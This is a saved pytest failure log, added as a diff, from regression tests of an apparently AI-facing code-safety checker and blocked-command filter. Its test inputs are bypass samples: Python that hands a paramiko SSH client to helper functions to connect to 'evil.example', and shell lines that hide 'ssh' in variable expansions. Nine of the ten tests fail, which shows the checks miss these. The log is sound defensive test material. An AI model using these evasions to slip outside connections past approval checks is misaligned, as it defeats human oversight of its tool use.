@@ -1,0 +1,64 @@
+FFFFFFFFF.                                                               [100%]
+=================================== FAILURES ===================================
+_ test_helper_clients_require_approval[import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\ndeploy(paramiko.SSHClient())] _
+/evidence/round18_regressions.py:14: in test_helper_clients_require_approval
+    assert _check_code_safety(code,session_id='round18') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\ndeploy(paramiko.SSHClient())", session_id='round18')
+_ test_helper_clients_require_approval[import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\nc=paramiko.SSHClient(); deploy(client=c)] _
+/evidence/round18_regressions.py:14: in test_helper_clients_require_approval
+    assert _check_code_safety(code,session_id='round18') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\nc=paramiko.SSHClient(); deploy(client=c)", session_id='round18')
+_ test_helper_clients_require_approval[import paramiko\ndef deploy(*,client): client.connect(hostname='evil.example')\ndeploy(client=paramiko.SSHClient())] _
+/evidence/round18_regressions.py:14: in test_helper_clients_require_approval
+    assert _check_code_safety(code,session_id='round18') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef deploy(*,client): client.connect(hostname='evil.example')\ndeploy(client=paramiko.SSHClient())", session_id='round18')
+_ test_helper_clients_require_approval[import paramiko\ndef deploy(client=paramiko.SSHClient()): client.connect(hostname='evil.example')\ndeploy()] _
+/evidence/round18_regressions.py:14: in test_helper_clients_require_approval
+    assert _check_code_safety(code,session_id='round18') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef deploy(client=paramiko.SSHClient()): client.connect(hostname='evil.example')\ndeploy()", session_id='round18')
+_ test_helper_clients_require_approval[import paramiko\ndef outer(source): inner(source)\ndef inner(client): client.connect(hostname='evil.example')\nouter(paramiko.SSHClient())] _
+/evidence/round18_regressions.py:14: in test_helper_clients_require_approval
+    assert _check_code_safety(code,session_id='round18') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef outer(source): inner(source)\ndef inner(client): client.connect(hostname='evil.example')\nouter(paramiko.SSHClient())", session_id='round18')
+_ test_expanded_command_assignment_fails_closed[cmd=${PR10642_UNSET:-ssh}; "$cmd" -F none evil.example] _
+/evidence/round18_regressions.py:25: in test_expanded_command_assignment_fails_closed
+    assert _find_blocked_commands(command)
+E   assert set()
+E    +  where set() = _find_blocked_commands('cmd=${PR10642_UNSET:-ssh}; "$cmd" -F none evil.example')
+_ test_expanded_command_assignment_fails_closed[cmd="${PR10642_UNSET:-ssh}"; "$cmd" -F none evil.example] _
+/evidence/round18_regressions.py:25: in test_expanded_command_assignment_fails_closed
+    assert _find_blocked_commands(command)
+E   assert set()
+E    +  where set() = _find_blocked_commands('cmd="${PR10642_UNSET:-ssh}"; "$cmd" -F none evil.example')
+_ test_expanded_command_assignment_fails_closed[cmd=${PR10642_UNSET-ssh}; $cmd -F none evil.example] _
+/evidence/round18_regressions.py:25: in test_expanded_command_assignment_fails_closed
+    assert _find_blocked_commands(command)
+E   AssertionError: assert set()
+E    +  where set() = _find_blocked_commands('cmd=${PR10642_UNSET-ssh}; $cmd -F none evil.example')
+_ test_expanded_command_assignment_fails_closed[cmd=${PR10642_UNSET:=ssh}; "$cmd" -F none evil.example] _
+/evidence/round18_regressions.py:25: in test_expanded_command_assignment_fails_closed
+    assert _find_blocked_commands(command)
+E   assert set()
+E    +  where set() = _find_blocked_commands('cmd=${PR10642_UNSET:=ssh}; "$cmd" -F none evil.example')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round18_regressions.py::test_helper_clients_require_approval[import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\ndeploy(paramiko.SSHClient())]
+FAILED ../evidence/round18_regressions.py::test_helper_clients_require_approval[import paramiko\ndef deploy(client): client.connect(hostname='evil.example')\nc=paramiko.SSHClient(); deploy(client=c)]
+FAILED ../evidence/round18_regressions.py::test_helper_clients_require_approval[import paramiko\ndef deploy(*,client): client.connect(hostname='evil.example')\ndeploy(client=paramiko.SSHClient())]
+FAILED ../evidence/round18_regressions.py::test_helper_clients_require_approval[import paramiko\ndef deploy(client=paramiko.SSHClient()): client.connect(hostname='evil.example')\ndeploy()]
+FAILED ../evidence/round18_regressions.py::test_helper_clients_require_approval[import paramiko\ndef outer(source): inner(source)\ndef inner(client): client.connect(hostname='evil.example')\nouter(paramiko.SSHClient())]
+FAILED ../evidence/round18_regressions.py::test_expanded_command_assignment_fails_closed[cmd=${PR10642_UNSET:-ssh}; "$cmd" -F none evil.example]
+FAILED ../evidence/round18_regressions.py::test_expanded_command_assignment_fails_closed[cmd="${PR10642_UNSET:-ssh}"; "$cmd" -F none evil.example]
+FAILED ../evidence/round18_regressions.py::test_expanded_command_assignment_fails_closed[cmd=${PR10642_UNSET-ssh}; $cmd -F none evil.example]
+FAILED ../evidence/round18_regressions.py::test_expanded_command_assignment_fails_closed[cmd=${PR10642_UNSET:=ssh}; "$cmd" -F none evil.example]
+9 failed, 1 passed, 1 warning in 0.13s
